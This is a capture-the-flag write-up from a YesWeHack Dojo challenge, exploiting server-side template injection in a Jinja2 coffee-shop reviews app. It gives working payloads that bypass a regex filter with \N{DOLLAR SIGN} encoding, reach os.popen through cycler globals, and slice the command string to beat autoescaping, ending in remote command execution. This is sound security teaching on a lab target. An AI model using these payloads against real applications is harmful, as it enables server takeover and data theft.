# Server Side Template Injection (CWE-1336) leading to RCE (Remote Code Execution)

## Introduction

In this month dojo, we got the opportunity to look at the reviews page of a coffee shop. And it look like the shop make good coffee but weak sanitization of users inputs.

So let's see how we can exploit it : sing a **Server Side Template Injection**, we can achieve remote code execution on the server.

We will learn how to find and perform the exploit, and of course see of this could have been prevented, in order to keep the coffee and the users data safe !

## Description of the vulnerability

"A Server Side Template Injection (SSTI) is when an attacker is able to use native template syntax to inject a malicious payload into a template, which is then executed server-side." [*- portswigger.net*](https://portswigger.net/web-security/server-side-template-injection)

In short, a user input is not sanitized properly and then rendered by the server inside a webpage.

The danger of a SSTI is that the the rendering is done on the server side, so with a special payload, an attacker could achieve arbitrary code execution and fully compromise the server.

## Exploitation – steps to reproduce

In order to find the exploit, the coffee shop provided us with the source code of the application (very nice of them). The import part of the code tell us about the technology used here :
```python
import re
from urllib.parse import unquote
from jinja2 import Environment, Template, FileSystemLoader
```
The server is using **jinja2**, which is a [templating engine](https://jinja.palletsprojects.com/en/3.1.x/) to use with Flask to create web application in python. Let's look at the rest of the code.

#### 1°/ analyzing the source code:

The most important part of the code is the class `Review` :
```python
class Review():
    reviews = {
        "Best coffee in town": 5,
        "My espresso was to strong": 2,
        "Good beans": 3,
    }

    def getPage(self) -> str:
        return env.from_string('''
        <% extends "index.html" %>
        <% block list %>
        <% for review, stars in reviews.items() %>
            <div class="review">
                <img class="profile" src="">
                <div class="stars" value="${ stars }"></div>
                <p>${ review } </p>
            </div>
        <% endfor %>
        <% endblock %>
        ''').render(reviews=self.reviews)            

    def addReview(self, review:str):
        # If the review seems to be malicious, make a good review instead
        if re.search(r"(\\[xu0-9]|\$)", review, re.IGNORECASE):
            review = "Best coffee I had"
        else:    
            review = ( bytes(review, "utf-8").decode("unicode_escape") )
        self.reviews[review] = 5

review = Review()
review.addReview(unquote("good%20coffee"))

print( env.from_string(review.getPage()).render() )
```

the class itself has 2 methods : `addReview` where the user comment is received and 'sanitized', and `getPage` where the review page is rendered by the server.

We can clearly see the logic flow of the application here : when a user send a review, it's being analyzed by the method `addReview`. If nothing malicious is found, the review is left intact. Else it's transformed to `"Best coffee I had"`.  Then it's stored in the `reviews` dictionary with the review as the key and the number of stars as the value. (It's not very cool because if I put the exact same comment as someone else, I can overwrite their number of stars given)

Then the reviews from the dict item `reviews` are being displayed in the method `getPage` using a dynamic template. We can see the variable `review` inside the **jinja2** marker `${ }`.
This marker is used by the engine to inject variables to be printed. But if not sanitized properly, we can also execute method and function inside. 

So this is where the injection will take place !

The exploit will work in 2 steps : 
1. bypassing the filters in place. We might need some specials characters like `$` and the current blacklist is preventing that
2. Once we have a way to use the characters we want, we need to find a way to exploit the injection to get OS command injection and achieve RCE.

Let's try get a working injection : the most used proof of concept (PoC) is to execute a simple mathematical operation by injecting `${7*7}`
#### 2°/ bypassing the filters:

the method `addReview` use a regex function to detect malicious characters that could be used in a SSTI :
```python
re.search(r"(\\[xu0-9]|\$)", review, re.IGNORECASE)
```
The blacklist will flag any substring with `\` followed by either `x`,`u` or any digit. It's also case insensitive so `X` and `U` will also be flagged.
So the regex will flag `\x`, `\u` or `\[0-9]` (any digit). Thoses are used in python string to identify unicode encoding (`\u`), hexadecimal encoding (`\x`) and octal (`\[0-9]`).
So any encoding using theses is to be forgotten if we don't want our payload to be transformed in `"Best coffee I had"`.

The backlist also look for the character `$`, which will be very annoying as the **jinja2** use the dollar sign for the dynamic marker `${}`.

So it look like any attempt to inject a working payload will be flagged...

However, the regex is incomplete ! In fact, there is another way of encoding string in python:
![](dojo31/img/ywh-1.png)

*From [docs.python.orgs](https://docs.python.org/3/howto/unicode.html#the-string-type)*

So we can encode string with `\N`, which is not blacklist !

So for example, encoding `$` would give `\N{DOLLAR SIGN}` :

![](dojo31/img/ywh-2.png)

We can try if this enough to bypass the blacklist with the previously mentioned payload :
`${7*7}` -> `\N{DOLLAR SIGN}{7*7}` :
![](dojo31/img/ywh-3.png)

And it work ! We can see the review take the value `49`, which is the result of the operation `7 * 7`.

#### 3°/ Escaping the sandbox and getting RCE:

Now that we have a way to inject dynamic content inside the template, we need to find a way to access the python OS library to get system code execution.

We cannot directly put python code as this is not how the templating engine work. We cannot use builtin method like list() or str() nor import library. 

One of the most common way is to escape the application context by using an existing module to pivote to another one. The goal here will be to access the `os` module to use `os.popen()` and get command execution.

To find the `os` module, the fastest way is to find an existing module that already import `os` for us to it. Depending of the application, this can take some time.

Fortunately, there are great peoples out there working for the community so we don't have to loose time on this. For example, the work of **[Podalirius](https://podalirius.net/en/publications/grehack-2021-optimizing-ssti-payloads-for-jinja2/)** is really great and I really encourage people to read this blog post. 

Long story short, he mapped all the existing modules of **jinja2** that import the `os` module to ease the process of **SSTI** for pentesters (1000 thanks to him).

For example, the following path can be used to access the `os` module :
```python
cycler.__init__.__globals__.os
```
`cycler` is being imported in the context of the **jinja2** application, and we can abuse the it to access the `os` module (everything is explained in details on **Podalirius** website).

So the following payload should give use remote code execution :
`${cycler.__init__.__globals__.os.popen('id').read()}`
Which give us once encoded properly to escape filters :
`\N{DOLLAR SIGN}{cycler.__init__.__globals__.os.popen('id').read()}`

Let's see if it work !
![](dojo31/img/ywh-4.png)
And... it doesn't work

The error from the server indicate that a `&` character is found, but we didn't injected it ! So where does it come from ?

Well, in the application configuration, we can see a interesting parameter :
```python
env = Environment(
    autoescape=True, # <- this one
    loader=FileSystemLoader('./templates'),
    variable_start_string="${",
    variable_end_string="}",
    block_start_string="<%",
    block_end_string="%>",
)
```
`autoescape` is set to `True`, so any special characters will be escape to HTML entities.
In our payload, we use the `'` characters which become `&#39` in HTML entity. This mean the browser know how to display but it will not be interpreted. And that's bad because it's escaped **before** the engine render the output of the command.

So with the current application configuration, we cannot use specials characters like `'<>"
 in the payload. So what, we cannot pass a string as an argument to `os.popen()` ? 

Well, kinda. But maybe we can build a string in another way and pass it as an argument to `os.popen()`.

#### 4°/ Creating the payload for the OS command injection:

So, how to pass the command string to `os.popen` ? Well, we can control the user input right ? Then let's pass the command there.

The first thing we need to do is find how to access the `Review` object where our payload is. To do so, the easiest thing to do is access the whole list of classes imported in the context, including the `Review` class. 

To get the list of all classes, use the following payload :
`${[].__class__.__base__.__subclasses__()}`
Which give us once encoded properly to escape filters :
`\N{DOLLAR SIGN}{[].__class__.__base__.__subclasses__()}` :
![](dojo31/img/ywh-5.png)

Once we have the list of classes, we can decode it using [cyberchief](https://cyberchef.org/#recipe=From_HTML_Entity()):
![](dojo31/img/ywh-6.png)
We can see find that the `Review` class is in the 2 index starting from the end. We can access it using the index `[-2]`. Once we have access to review class, we can access the reviews by calling the attribue `Review.reviews`. This will return the dict object created by the application, with our input inside :
![](dojo31/img/ywh-7.png)
But this is a dict object, so we need to transform it to a string. Fortunately, we can use the built-in method `__str__()`:
`${[].__class__.__base__.__subclasses__()[-2].reviews.__str__()}`.
And once we have a string object, we can extract any substring using python built-in slicing.
For example  if `input = "abenvcdf"` , then`input[2:5] = "env"`.

See what, I'm doing here ? If we append any string outside the dynamic marker in our input, it will not impact the code execution can still be retrieved and extracted in the reviews string.

For example the payload : 
`${[].__class__.__base__.__subclasses__()[-2].reviews.__str__()[-7:-5]}id`
Which give us once encoded properly to escape filters :
`\N{DOLLAR SIGN}{[].__class__.__base__.__subclasses__()[-2].reviews.__str__()[-7:-5]}id`
Will extract only the substring `id` from the review. We need to start 5 char from the end because the HTML escaped string create some characters at the end.

The proof in action :
![](dojo31/img/ywh-8.png)

Now that it work, we can use this with the previous OS command injection to try to execute a command on the server. Will will use the following payload :
`${cycler.__init__.__globals__.os.popen([].__class__.__base__.__subclasses__()[-2].reviews.__str__()[-7:-5]).read()}id`
Which give us once encoded properly to escape filters :
`\N{DOLLAR SIGN}{cycler.__init__.__globals__.os.popen([].__class__.__base__.__subclasses__()[-2].reviews.__str__()[-7:-5]).read()}id` :
![](dojo31/img/ywh-9.png)
And it work  ! We got a successful OS command injection on the server !
## PoC 

Using the following payload :
```python
\N{DOLLAR SIGN}{cycler.__init__.__globals__.os.popen([].__class__.__base__.__subclasses__()[-2].reviews.__str__()[-15:-5]).read()}echo \N{DOLLAR SIGN}FLAG
```
We can dump the content of the env variable `$FLAG` :
![](dojo31/img/ywh-10.png)
`FLAG : FLAG{C0ff33_C0ff33_M0r3_C0ff33!!}`

## How to prevent

Well, the easiest fix for our coffee shop is to better sanitize users reviews.
For example, adding `\N` to the regex of the `addReview` method would prevent the current payload from working. Also blacklisting the character `{` could prevent any payload in this context. Another thing to do is apply the detection regex **after** the unicode decoding of the string. So the `$` already decoded would have been flagged as malicious and prevented the RCE.

There are other way to protect an application from SSTI but the best way is to **never trust user input** and add as many filters as needed.

## Conclusion

Thanks for this challenge **Brumens** , I really enjoyed the new UI and the complexity of the payload. Thanks for the Dojo and everything ❤️ !

#### #YesWeRHackers

## Sources 

https://portswigger.net/web-security/server-side-template-injection
https://podalirius.net/en/publications/grehack-2021-optimizing-ssti-payloads-for-jinja2/
https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection/jinja2-ssti
https://docs.python.org/3/howto/unicode.html#the-string-type
https://infosecwriteups.com/ssti-bypassing-single-quotes-filter-dc0ee4e4f011
https://secure-cookie.io/attacks/ssti/